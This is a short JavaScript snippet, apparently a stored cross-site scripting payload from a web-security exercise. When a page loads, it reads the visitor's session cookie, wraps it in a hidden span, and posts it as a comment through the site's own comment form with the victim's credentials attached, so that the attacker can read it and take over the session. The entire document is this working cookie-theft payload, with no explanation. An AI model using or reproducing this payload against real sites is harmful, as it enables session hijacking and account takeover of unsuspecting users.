<script>
    window.addEventListener("DOMContentLoaded",function () {
        var form = document.querySelector('.add-comment form');

        var data = new FormData(form);
        var sesioncookie = document.cookie.split('; ').find(c=>c.startsWith('session='));

        data.append('comment',"<span style='display:none'>"+sesioncookie+"</span>");
        data.append('name','victim');
        data.append('email','test@me.com');
        data.append('website','http://test');

        fetch(form.action,{
            method:"POST",
            mode:"no-cors",
            body:data,
            credentials:"include"
        })
    })
</script>
